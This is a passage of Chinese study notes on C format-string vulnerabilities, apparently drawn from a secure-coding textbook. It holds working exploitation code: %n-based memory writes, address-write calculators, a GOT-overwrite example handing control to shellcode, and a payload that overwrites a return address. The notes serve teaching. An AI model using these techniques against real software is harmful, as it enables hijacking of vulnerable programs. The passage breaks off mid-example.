<p>参数过多，多余的参数被忽略；参数不足，结果未定义</p>
</li>
<li>转换指示符（conversion specifier）<ul>
<li>用途：指示所应用的转换类型</li>
<li>常用的转换指示符：<code>%c</code>（字符型）、<code>%d</code>（整型）、<code>%f</code>（浮点型）、<code>%o</code>（八进制整数）、<code>%x</code>（十六进制整数）、<code>%s</code>（字符串）</li>
</ul>
</li>
<li>宽度（width）<ul>
<li>指定输出字符的最小个数的十进制非负整数。如果输出的字符个数比指定的宽度小，就用空白字符补足</li>
<li>如果使用星号（*）来指定宽度，则宽度将由参数列表中的一个int型的值提供
    <div class="highlight"><pre><span></span><code><span class="cm">/* An example using '*' */</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%0*d"</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">3</span><span class="p">);</span> <span class="cm">/* 00003 is output */</span>
</code></pre></div></li>
</ul>
</li>
<li>精度（precision）<ul>
<li>用来指示打印字符个数、小数位数或者有效数字个数的非负十进制整数</li>
<li>可能会引起输出的截断或浮点值的舍入</li>
<li>如果精度域是一个星号（*），那么它的值就由参数列表中的一个int参数提供
    <div class="highlight"><pre><span></span><code><span class="cm">/* An example using '*' */</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%.*f"</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mf">3.14159265</span><span class="p">);</span> <span class="cm">/* outputs 3.142  */</span>
</code></pre></div></li>
</ul>
</li>
<li>Visual C++中的长度修饰符<ul>
<li>l32 ~ <code>l</code>；l64 ~ <code>ll</code></li>
</ul>
</li>
</ul>
<h2 id="_3">漏洞利用<a class="headerlink" href="#_3" title="Permanent link">¶</a></h2>
<h3 id="_4">缓冲区溢出<a class="headerlink" href="#_4" title="Permanent link">¶</a></h3>
<div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
<span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">"Wrong command: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">user</span><span class="p">);</span>
</code></pre></div>
<ul>
<li>当<code>user</code>大于512-16(<code>"Wrong command: "</code>)-1字节时，就会越界写</li>
</ul>
<h3 id="_5">可伸展的缓冲区<a class="headerlink" href="#_5" title="Permanent link">¶</a></h3>
<div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">outbuf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
<span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
<span class="hll"><span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="s">"ERR Wrong command: %.400s"</span><span class="p">,</span> <span class="n">user</span><span class="p">);</span>
</span><span class="c1">//目前没有问题，因为转换说明符%.400s限制了只能写入400字节</span>
<span class="n">sprintf</span><span class="p">(</span><span class="n">outbuf</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="c1">//user = %497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;，包含百分号%，497 = 512 - 16 - 1</span>
<span class="c1">//0xbfffd33c覆盖掉了main的返回地址！</span>
<span class="c1">//在这个例子中，若要复制字符串，请用strcpy或strncpy</span>
</code></pre></div>
<ul>
<li>格式规范<code>%497d</code>指示函数<code>sprintf()</code>从栈中读出一个假的参数并向缓冲区中写入497个字符<ul>
<li>现在的outbuf = "ERR Wrong command: [497 chars][more contents...]"，至<code>%497d</code>为止已经盖满了<code>outbuf</code>，再接下来马上就要改动掉返回地址</li>
</ul>
</li>
</ul>
<h3 id="printf">输出流（<code>printf()</code>）<a class="headerlink" href="#printf" title="Permanent link">¶</a></h3>
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">printf</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div>
<div class="tabbed-set tabbed-alternate" data-tabs="3:4"><input checked="checked" id="__tabbed_3_1" name="__tabbed_3" type="radio"><input id="__tabbed_3_2" name="__tabbed_3" type="radio"><input id="__tabbed_3_3" name="__tabbed_3" type="radio"><input id="__tabbed_3_4" name="__tabbed_3" type="radio"><div class="tabbed-labels"><label for="__tabbed_3_1">程序崩溃</label><label for="__tabbed_3_2">查看栈内容</label><label for="__tabbed_3_3">查看内存内容</label><label for="__tabbed_3_4">覆写内存</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<ul>
<li>在UNIX系统中，存取无效的指针会引发SIGSEGV信号，引起core dump</li>
<li><code>printf("%s%s%s%s%s%s%s%s%s%s%s%s")</code>会触发无效指针存取或未映射的地址读取<ul>
<li>转换指示符%s显示执行栈上相应参数所指定的地址的内存</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>参数以逆序压入栈中</li>
<li>参数在内存中出现的顺序与在<code>printf()</code>调用时出现的顺序是一致的
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="hll">    <span class="n">strcpy</span><span class="p">(</span><span class="n">format</span><span class="p">,</span><span class="s">"%08x.%08x.%08x.%08x"</span><span class="p">);</span>
</span>    <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
    <span class="c1">//will print "00000001.00000002.00000003.00132588"</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
    <span class="c1">//will print "00132588.00132580.7ffdf000.cccccccc"</span>
<span class="p">}</span>
</code></pre></div></li>
</ul>
<p><img alt="" src="md-img/20191202_03.png"/></p>
<ul>
<li>紧邻参数之后的内存中包含有调用函数的自动变量，后者包括format字符数组0x2e253038的内容</li>
<li>随着每一个参数被相应的格式规范所耗用，参数指针的值也根据参数的长度不断递增</li>
<li>格式化输出函数将不断输出内容，遇到格式字符串的空字节为止<ul>
<li>显示完当前函数的剩余自动变量后，就会显示函数的栈帧（包括返回地址和参数）</li>
<li>也会显示调用函数的信息</li>
<li>甚至扩展到显示整个栈</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>转换指示符<code>%s</code>显示参数指针所指定的地址的内存，将它作为一个ASCII字符串处理，直至遇到一个空字符</li>
<li>还可使用<code>%x</code>使参数指针前向移动，距离仅受格式字符串的大小限制</li>
<li>攻击者就能够在调用函数的自动变量中插入一个地址<ul>
<li>如果格式字符串被存储为一个自动变量，那么地址就能被插入在字符串的开始部分。</li>
</ul>
</li>
<li>例子
    <div class="highlight"><pre><span></span><code><span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
<span class="hll"><span class="n">strcpy</span><span class="p">(</span><span class="n">format</span><span class="p">,</span><span class="s">"%08x.%08x.%08x.%s"</span><span class="p">);</span>
</span><span class="c1">//strcpy(format,"%s");  //format = "addr[%x...%x]%s"</span>
<span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
<span class="c1">//printf(format);</span>
</code></pre></div><ul>
<li><code>%s</code>可以显示内存，直到<code>\0</code>结束<ul>
<li><code>\xdc\xf5\x42\x01%x%x%x%s</code>将显示从<code>0x0142f5dc</code>的内存直到遇到字节\0结束</li>
</ul>
</li>
<li><code>format = "addr[%x...%x]%s"</code>添加若干个<code>%x</code>以“前进”到<code>format</code>所在的地址<ul>
<li>因为<code>format</code>不一定与<code>&amp;format</code>相邻</li>
</ul>
</li>
</ul>
</li>
</ul>
</div>
<div class="tabbed-block">
<ul>
<li>格式化符<code>%n</code>：到<code>%n</code>位置已经输出的字符总数
    <div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="hll"><span class="n">printf</span><span class="p">(</span><span class="s">"hello%n</span><span class="se">\n</span><span class="s">"</span><span class="p">,(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">i</span><span class="p">);</span> <span class="c1">//(1) after this, i = 5, before %n we have already write 5 characters(h-e-l-l-o).</span>
</span><span class="hll"><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\xdc\xf5\x42\x01</span><span class="s">%08x.%08x.%08x%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span> <span class="c1">//(2) after this, [0x0142f5dc]=28(8x3+4)</span>
</span></code></pre></div></li>
<li>格式化符<code>%u</code>：控制写入的字符个数（“宽度”）<ul>
<li>每一个格式字符串都耗用两个参数：<ol>
<li>转换指示符%u所使用的整数值</li>
<li>输出的字符个数
<div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="hll"><span class="n">printf</span><span class="p">(</span><span class="s">"%10u%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">i</span><span class="p">);</span> <span class="c1">//i = 10</span>
</span><span class="hll"><span class="n">printf</span><span class="p">(</span><span class="s">"%100u%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">i</span><span class="p">);</span> <span class="c1">//i = 100</span>
</span></code></pre></div></li>
</ol>
</li>
</ul>
</li>
<li>
<p>写一个地址</p>
<ul>
<li>
<p>大多数CISC中：写入四个字节 → 递增地址 → 再写入四个字节 ...
    <div class="highlight"><pre><span></span><code><span class="n">printf</span><span class="p">(</span><span class="s">"%16u%n%16u%n%32u%n%64u%n"</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
<span class="c1">//计数器没有被重置，所以第一个%16u%n写入16，第二个%16u%n写32字节，以此类推</span>
<span class="c1">//或者...</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%16u%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%32u%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%64u%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%128u%n"</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">foo</span><span class="p">[</span><span class="mi">3</span><span class="p">]);</span>
</code></pre></div></p>
<ul>
<li>也可以在地址递减时，从高位内存写到低位内存</li>
</ul>
</li>
<li>
<p>利用代码
    <div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">already_written</span><span class="p">;</span> <span class="c1">//(1) 用于存储输出的字符个数（等于格式化输出函数的输出计数器的值）</span>
<span class="linenos" data-linenos=" 2 "></span><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">width_field</span><span class="p">;</span> <span class="c1">//(2) 存储有转换规范%n所需要的宽度域的值</span>
<span class="linenos" data-linenos=" 3 "></span><span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">write_byte</span><span class="p">;</span> <span class="c1">//(3) 包含下一个将要写入的字节值</span>
<span class="linenos" data-linenos=" 4 "></span><span class="k">static</span> <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
<span class="linenos" data-linenos=" 5 "></span><span class="n">already_written</span> <span class="o">=</span> <span class="mi">506</span><span class="p">;</span>
<span class="linenos" data-linenos=" 6 "></span>
<span class="linenos" data-linenos=" 7 "></span><span class="c1">// first byte</span>
<span class="linenos" data-linenos=" 8 "></span><span class="n">write_byte</span> <span class="o">=</span> <span class="mh">0x3C8</span><span class="p">;</span>
<span class="linenos" data-linenos=" 9 "></span><span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="10 "></span><span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_byte</span> <span class="o">-</span> <span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="11 "></span><span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="hll"><span class="linenos" data-linenos="12 "></span><span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"%%%du%%n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
</span><span class="linenos" data-linenos="13 "></span><span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="linenos" data-linenos="14 "></span>
<span class="linenos" data-linenos="15 "></span><span class="c1">// second byte</span>
<span class="linenos" data-linenos="16 "></span><span class="n">write_byte</span> <span class="o">=</span> <span class="mh">0x3fA</span><span class="p">;</span>
<span class="linenos" data-linenos="17 "></span><span class="n">already_written</span> <span class="o">+=</span> <span class="n">width_field</span><span class="p">;</span>
<span class="linenos" data-linenos="18 "></span><span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="19 "></span><span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_byte</span> <span class="o">-</span> <span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="20 "></span><span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="hll"><span class="linenos" data-linenos="21 "></span><span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"%%%du%%n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
</span><span class="linenos" data-linenos="22 "></span><span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="linenos" data-linenos="23 "></span>
<span class="linenos" data-linenos="24 "></span><span class="c1">// third byte</span>
<span class="linenos" data-linenos="25 "></span><span class="n">write_byte</span> <span class="o">=</span> <span class="mh">0x442</span><span class="p">;</span>
<span class="linenos" data-linenos="26 "></span><span class="n">already_written</span> <span class="o">+=</span> <span class="n">width_field</span><span class="p">;</span>
<span class="linenos" data-linenos="27 "></span><span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="28 "></span><span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_byte</span> <span class="o">-</span> <span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="29 "></span><span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="hll"><span class="linenos" data-linenos="30 "></span><span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"%%%du%%n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
</span><span class="linenos" data-linenos="31 "></span><span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
<span class="linenos" data-linenos="32 "></span>
<span class="linenos" data-linenos="33 "></span><span class="c1">// fourth byte</span>
<span class="linenos" data-linenos="34 "></span><span class="n">write_byte</span> <span class="o">=</span> <span class="mh">0x501</span><span class="p">;</span>
<span class="linenos" data-linenos="35 "></span><span class="n">already_written</span> <span class="o">+=</span> <span class="n">width_field</span><span class="p">;</span>
<span class="linenos" data-linenos="36 "></span><span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="37 "></span><span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_byte</span> <span class="o">-</span> <span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="linenos" data-linenos="38 "></span><span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="hll"><span class="linenos" data-linenos="39 "></span><span class="n">sprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="s">"%%%du%%n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
</span><span class="linenos" data-linenos="40 "></span><span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="n">buffer</span><span class="p">);</span>
</code></pre></div></p>
</li>
<li>
<p>覆写内存</p>
<div class="highlight"><pre><span></span><code><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">exploit</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x90\x90</span><span class="s">...</span><span class="se">\x90</span><span class="s">"</span><span class="p">;</span>
<span class="kt">char</span> <span class="n">format</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
<span class="n">strcpy</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="s">"</span><span class="p">);</span>  <span class="c1">//哑整数</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xdc\xf5\x42\x01</span><span class="s">"</span><span class="p">);</span>  <span class="c1">//地址</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="s">"</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xdd\xf5\x42\x01</span><span class="s">"</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="s">"</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xde\xf5\x42\x01</span><span class="s">"</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="s">"</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"</span><span class="se">\xdf\xf5\x42\x01</span><span class="s">"</span><span class="p">);</span>
<span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">61</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
   <span class="n">strcat</span><span class="p">(</span><span class="n">format</span><span class="p">,</span> <span class="s">"%x"</span><span class="p">);</span> <span class="c1">//将参数指针步进到格式字符串的起点以及第一个哑整数/地址对</span>
<span class="p">}</span>
<span class="cm">/* code to write address goes here */</span>
<span class="n">printf</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
</code></pre></div>
</li>
</ul>
</li>
</ul>
</div>
</div>
</input></input></input></input></div>
<h3 id="_6">国际化<a class="headerlink" href="#_6" title="Permanent link">¶</a></h3>
<ul>
<li>格式字符串和消息文本通常被移动到由程序在运行时打开的外部目录或文件中<ul>
<li>攻击者可以通过修改这些文件的内容从而改动程序的格式和字符串的值</li>
</ul>
</li>
</ul>
<h3 id="_7">栈随机化<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
<ul>
<li>在Linux下，栈的起始地址为<code>0xC0000000</code>并且朝低内存方向增长<ul>
<li>随机化通过向栈中插入随机的间隙实现</li>
<li>随机化加大了漏洞利用难度，但不能阻止漏洞利用</li>
</ul>
</li>
<li>
<p>阻碍栈随机化</p>
<ul>
<li>覆写GOT入口或其他地址<ul>
<li>优势：独立于栈和堆这样的系统变量</li>
</ul>
</li>
<li>将shellcode插入到数据段或堆上的变量中</li>
<li>参数指针和格式字符串的相对距离不变<ul>
<li>攻击者：找到参数指针与格式字符串的起始位置之间的距离，并插入适当数量的<code>%x</code>格式转换规范</li>
</ul>
</li>
<li>以双字格式写地址<ul>
<li>将一个shellcode的地址分成四次每次写入一个字节，各次调用之间对地址进行递增</li>
<li>或者，每次写入一个字，甚至写入全部内容</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Linux利用若干例</p>
<div class="tabbed-set tabbed-alternate" data-tabs="4:2"><input checked="checked" id="__tabbed_4_1" name="__tabbed_4" type="radio"><input id="__tabbed_4_2" name="__tabbed_4" type="radio"><div class="tabbed-labels"><label for="__tabbed_4_1">例1</label><label for="__tabbed_4_2">例2</label></div>
<div class="tabbed-content">
<div class="tabbed-block">
<div class="highlight"><pre><span></span><code><span class="cm">/* Linux 利用一例 */</span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[</span><span class="mi">1024</span><span class="p">]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x09\x09\x09\x09\x09</span><span class="s">/bin/sh"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">format_str</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="s">"</span><span class="se">\xaa\xaa\xaa\xaa</span><span class="s">"</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="s">"</span><span class="se">\xb4\x9b\x04\x08</span><span class="s">"</span><span class="p">);</span> <span class="c1">//(1) exit()函数的GOT入口的地址(0x08049bb4)被连接到格式字符串</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="s">"</span><span class="se">\xcc\xcc\xcc\xcc</span><span class="s">"</span><span class="p">);</span>
    <span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="s">"</span><span class="se">\xb6\x9b\x04\x08</span><span class="s">"</span><span class="p">);</span> <span class="c1">//(2) 该地址被+2后(0x08049bb6)也连接到格式字符串</span>
    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="s">"%x"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="cm">/* code to write address goes here */</span>

    <span class="n">printf</span><span class="p">(</span><span class="n">format_str</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>        <span class="c1">//控制权被移交至shellcode</span>
<span class="p">}</span>
</code></pre></div>
</div>
<div class="tabbed-block">
<div class="highlight"><pre><span></span><code><span class="cm">/* Linux覆写内存 */</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">already_written</span><span class="p">,</span> <span class="n">width_field</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">write_word</span><span class="p">;</span>
<span class="k">static</span> <span class="kt">char</span> <span class="n">convert_spec</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>

<span class="n">already_written</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>

<span class="c1">// first word</span>
<span class="n">write_word</span> <span class="o">=</span> <span class="mh">0x9020</span><span class="p">;</span>
<span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x10000</span><span class="p">;</span>

<span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_word</span><span class="o">-</span><span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="n">sprintf</span><span class="p">(</span><span class="n">convert_spec</span><span class="p">,</span> <span class="s">"%%%du%%n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="n">convert_spec</span><span class="p">);</span>

<span class="c1">// last word</span>
<span class="n">already_written</span> <span class="o">+=</span> <span class="n">width_field</span><span class="p">;</span>
<span class="n">write_word</span> <span class="o">=</span> <span class="mh">0x0804</span><span class="p">;</span>
<span class="n">already_written</span> <span class="o">%=</span> <span class="mh">0x10000</span><span class="p">;</span>

<span class="n">width_field</span> <span class="o">=</span> <span class="p">(</span><span class="n">write_word</span><span class="o">-</span><span class="n">already_written</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="n">width_field</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span> <span class="n">width_field</span> <span class="o">+=</span> <span class="mh">0x10000</span><span class="p">;</span>
<span class="n">sprintf</span><span class="p">(</span><span class="n">convert_spec</span><span class="p">,</span> <span class="s">"%%%du%%n"</span><span class="p">,</span> <span class="n">width_field</span><span class="p">);</span>
<span class="n">strcat</span><span class="p">(</span><span class="n">format_str</span><span class="p">,</span> <span class="n">convert_spec</span><span class="p">);</span>
</code></pre></div>
</div>
</div>
</input></input></div>
</li>
</ul>
<h3 id="_8">直接存取参数<a class="headerlink" href="#_8" title="Permanent link">¶</a></h3>
<ul>
<li>数字式：<code>%n$</code>、<code>*m$</code>；非数字式：<code>%</code>、<code>*</code></li>
<li>Single UNIX规范[IEEE 04]允许转换被应用于参数列表中的格式之后的第n个参数上，而不是应用到下一个未使用的参数上。</li>
<li>n是一个1到提供给函数调用的参数的最大数目之间范围内的十进制整数，它指定了参数的位置。<ul>
<li>Red Hat Linux 9中该最大值是4096</li>
<li>有些系统（如System V）有下限值，如9</li>
<li>GCC中可以通过<code>sysconf(_SC_NL_ARGMAX)</code>获得运行时的有效值</li>
</ul>
</li>
<li>当使用数字式参数规范时，要想指定第n个参数，格式字符串中所有从第一个到第n-1个前导参数都要被指定。在包含有如<code>%n$</code>形式的转换规范的格式字符串中，参数列表中的数字式参数可视需要被从格式字符串中引用多次。
    <div class="highlight"><pre><span></span><code><span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="hll">
</span><span class="hll"><span class="n">printf</span><span class="p">(</span>
</span>      <span class="s">"%4$5u%3$n%5$5u%2$n%6$5u%1$n</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>  <span class="c1">//%4$5u 取第四个参数（这里是常数5），将输出格式化为无符号的十进制整数，宽度为5；%3$n 将当前输出计数器的值（5）写到第三个参数(&amp;i)所指定的地址；以此类推</span>
